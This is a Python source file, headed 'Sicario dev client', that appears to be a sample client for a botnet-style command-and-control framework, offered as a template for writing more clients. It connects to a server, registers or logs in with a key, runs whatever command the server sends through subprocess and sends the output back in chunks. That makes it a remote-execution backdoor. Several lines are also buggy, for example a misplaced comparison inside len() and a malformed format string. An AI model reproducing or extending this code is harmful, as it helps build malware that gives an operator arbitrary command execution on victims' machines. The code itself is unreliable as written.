# Sicario dev client 
# Warning: This client shouldn't be used anywhere, its just a presentation to help developers create their own clients

import socket, sys, subprocess, math

server_ip = '127.0.0.1'
server_port = 7319

userkey = False

def main(ip, port):
	print('[*] Reading userkey...')

	with open('userkey') as f:
		userkey = f.readline()

	if (len(userkey) != 32):
		print('[!] Userkey is invalid or does not exist')
		userkey = False

	print('[*] Creating socket...')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print('[*] Connecting to server...')

	s.connect((server_ip, server_port))

	print('[*] Performing handshake...')

	if userkey:
		s.send('SC00(login {})'.format(userkey))
	else:
		s.send('SC00(register)')

	response = s.recv(1024)

	if not response:
		print('[*] Got empty response - nothing to do! Exitting...')
		sys.exit(0)

	# response is present, so we gotta parse it
	command = response.split(' ')

	if (command[0] == 'set'):
		if (command[1] == 'key'):
			print('[*] Successfuly registered, key: {}'.format(command[2]))
			with open('userkey', 'w') as f:
				f.write(command[2])
				f.close()
	elif (command[0] == 'execute'):
		print('[*] Server wants us to execute a command')
		print('[*] Executing {}'.format(command[1]))

		result = subprocess.check_output([command[1]])
		
		if (len(result > 2048)): # we have to split data into smaller packets
			packet_count = math.ceil(len(result)/2048)
			for x in range(packet_count):
				s.send('SC{0:0>2}({})'.format(packet_count-x, result[x*2048:(x+1)*2048]))
		else:
			s.send('SC00({})'.format(result))



if __name__ == '__main__':
	main(server_ip, server_port) 